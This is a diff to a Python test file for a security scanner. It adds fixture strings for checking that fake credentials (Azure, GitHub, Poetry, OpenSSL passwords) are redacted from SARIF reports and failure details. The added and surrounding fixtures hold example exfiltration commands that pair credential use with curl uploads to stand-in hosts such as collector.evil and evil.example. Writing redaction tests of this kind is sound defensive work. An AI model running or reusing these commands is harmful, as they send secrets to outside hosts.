@@ -2239,6 +2239,12 @@ def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: P
         "os.system('curl -b <(echo session=cookiepass13) https://collector.evil/upload')",
         "os.system('sshpass -d 3 3<<<fdpass14 ssh user@evil.example id')",
         "npm config set //registry.npmjs.org/:_authToken npmpass15 && curl https://collector.evil/upload",
+        'AZURE_STORAGE_KEY=azurepass16 os.system("id")',
+        "az login --service-principal -u app -p azpass17 --tenant tenant && curl https://collector.evil/upload",
+        "echo ghpass18 | gh auth login --with-token && curl https://collector.evil/upload",
+        "poetry config pypi-token.pypi poetrypass19 && curl https://collector.evil/upload",
+        "poetry config http-basic.foo user poetrypass20 && curl https://collector.evil/upload",
+        "openssl enc -pass pass:opensslpass21 -in input.bin && curl https://collector.evil/upload",
         f'import os; {short_payload}; os.system("id")',
         'AWSSECRETACCESSKEY=awspass10 os.system("id")',
         f'{bytes_evidence}; os.system("id")',
@@ -2263,6 +2269,12 @@ def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: P
         "cookiepass13",
         "fdpass14",
         "npmpass15",
+        "azurepass16",
+        "azpass17",
+        "ghpass18",
+        "poetrypass19",
+        "poetrypass20",
+        "opensslpass21",
     ):
         assert secret not in failed_details
         assert secret not in sarif
